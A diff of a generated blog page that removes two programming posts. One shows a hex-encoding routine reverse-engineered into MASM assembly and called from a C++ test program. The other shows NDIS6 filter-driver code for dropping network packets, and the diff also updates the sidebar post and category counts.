-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Asm/windows/" itemprop="url" rel="index"><span itemprop="name">windows</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>  Some time ago, a friend asked me to help reverse engineer something, extract its code, save it as an assembly file, and compile and run it in VC (Visual C++).</p>
-<p>  asm file :</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">                .686p</span><br><span class="line">                .model flat,c</span><br><span class="line">        option casemap : none</span><br><span class="line">        </span><br><span class="line">        extern sprintf:proc</span><br><span class="line">        extern strcat:proc</span><br><span class="line">                </span><br><span class="line">.data</span><br><span class="line">               ___security_cookie dd 0BB40E64Eh</span><br><span class="line">               a02x_0 db &quot;%02X&quot;</span><br><span class="line">   </span><br><span class="line">.code  </span><br><span class="line">         public      sub_40B444    </span><br><span class="line">         </span><br><span class="line">sub_40B444        proc near                ; CODE XREF: sub_40CCEA+A4p</span><br><span class="line"></span><br><span class="line">;Source                = byte ptr -14h</span><br><span class="line">;var_4                = dword        ptr -4</span><br><span class="line">;arg_0                = dword        ptr  8</span><br><span class="line">;arg_4                = dword        ptr  0Ch</span><br><span class="line">;arg_8                = dword        ptr  10h</span><br><span class="line"></span><br><span class="line">                push        ebp</span><br><span class="line">                mov        ebp, esp</span><br><span class="line">                sub        esp, 14h</span><br><span class="line">                mov        eax, dword ptr ___security_cookie ; &quot;N鍬?</span><br><span class="line">                xor        eax, ebp</span><br><span class="line">                mov        [ebp-4], eax</span><br><span class="line">                push        ebx</span><br><span class="line">                mov        ebx, [ebp+8]</span><br><span class="line">                push        esi</span><br><span class="line">                mov        esi, [ebp+10h]</span><br><span class="line">                push        edi</span><br><span class="line">                xor        edi, edi</span><br><span class="line">                cmp        [ebp+0Ch], edi</span><br><span class="line">                mov        byte ptr [esi],        0</span><br><span class="line">                jbe        short loc_40B48E</span><br><span class="line"></span><br><span class="line">loc_40B467:                                ; CODE XREF: sub_40B444+48j</span><br><span class="line">                movzx        eax, byte ptr [ebx+edi]</span><br><span class="line">                push        eax</span><br><span class="line">                lea        eax, [ebp-14h]</span><br><span class="line">                push        offset a02x_0        ; &quot;%02X&quot;</span><br><span class="line">                push        eax                ; Dest</span><br><span class="line">                call        sprintf</span><br><span class="line">                lea        eax, [ebp-14h]</span><br><span class="line">                push        eax                ; Source</span><br><span class="line">                push        esi                ; Dest</span><br><span class="line">                call        strcat</span><br><span class="line">                add        esp, 14h</span><br><span class="line">                inc        edi</span><br><span class="line">                cmp        edi, [ebp+0Ch]</span><br><span class="line">                jb        short loc_40B467</span><br><span class="line"></span><br><span class="line">loc_40B48E:                                ; CODE XREF: sub_40B444+21j</span><br><span class="line">                mov        ecx, [ebp-4]</span><br><span class="line">                pop        edi</span><br><span class="line">                pop        esi</span><br><span class="line">                xor        ecx, ebp</span><br><span class="line">                leave</span><br><span class="line">                retn</span><br><span class="line">sub_40B444        endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-
-<p>The sample code is as follows:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">        char* sub_40B444(char*,int,char*);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">        char* pszBuf = new char[1024];</span><br><span class="line">        memset( pszBuf , 0 , 1024 );</span><br><span class="line">        strcpy_s( pszBuf , 1024 , &quot;des:&quot; );</span><br><span class="line">        sub_40B444( &quot;你总是说我在，这样孤单时候，才能想起与你联络&quot; , strlen(&quot;你总是说我在，这样孤单时候，才能想起与你联络&quot;) , pszBuf );</span><br><span class="line">        printf_s( &quot;format string : %s\n&quot; , &quot;你总是说我在，这样孤单时候，才能想起与你联络&quot; );</span><br><span class="line">        printf_s( &quot;format string : %s\n&quot; , pszBuf );</span><br><span class="line"></span><br><span class="line">       if( pszBuf != NULL )</span><br><span class="line">        &#123;</span><br><span class="line">           delete[]pszBuf;</span><br><span class="line">           pszBuf = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2009/07/14/ndis6DropPackage/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2009/07/14/ndis6DropPackage/" class="post-title-link" itemprop="url">NDIS6 how to drop packets</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2009-07-14 22:29:18" itemprop="dateCreated datePublished" datetime="2009-07-14T22:29:18-04:00">2009-07-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 12:02:49" itemprop="dateModified" datetime="2023-10-17T12:02:49-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kernel/" itemprop="url" rel="index"><span itemprop="name">Kernel</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kernel/windows/" itemprop="url" rel="index"><span itemprop="name">windows</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kernel/windows/ndis6/" itemprop="url" rel="index"><span itemprop="name">ndis6</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>In ndis6 how to drop packets?</p>
-<p>in FilterSendNetBufferLists:</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">FILTER_RELEASE_LOCK(&amp;pFilter-&gt;Lock, DispatchLevel);</span><br><span class="line"><span class="comment">//DEBUGP(DL_TRACE, (&quot;&lt;===SendNetBufferList [CheckPacket] drop this packet. \n&quot;));</span></span><br><span class="line"> </span><br><span class="line">CurrNbl = NetBufferLists;</span><br><span class="line">while (CurrNbl)</span><br><span class="line">&#123;</span><br><span class="line">    NET_BUFFER_LIST_STATUS(CurrNbl) = NDIS_STATUS_MEDIA_DISCONNECTED ;</span><br><span class="line">    CurrNbl = NET_BUFFER_LIST_NEXT_NBL(CurrNbl);</span><br><span class="line">&#125;</span><br><span class="line">NdisFSendNetBufferListsComplete(pFilter-&gt;FilterHandle,</span><br><span class="line">NetBufferLists,</span><br><span class="line">DispatchLevel ? NDIS_SEND_COMPLETE_FLAGS_DISPATCH_LEVEL : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-
-<p>in FilterReceiveNetBufferLists:</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILTER_RELEASE_LOCK(&amp;pFilter-&gt;Lock, DispatchLevel);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NDIS_TEST_RECEIVE_CAN_PEND(ReceiveFlags))</span><br><span class="line">&#123;</span><br><span class="line">    ReturnFlags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (NDIS_TEST_RECEIVE_AT_DISPATCH_LEVEL(ReceiveFlags))</span><br><span class="line">    &#123;</span><br><span class="line">        NDIS_SET_RETURN_FLAG(ReturnFlags, NDIS_RETURN_FLAGS_DISPATCH_LEVEL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NdisFReturnNetBufferLists(pFilter-&gt;FilterHandle, NetBufferLists, ReturnFlags);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1145,13 +1172,13 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
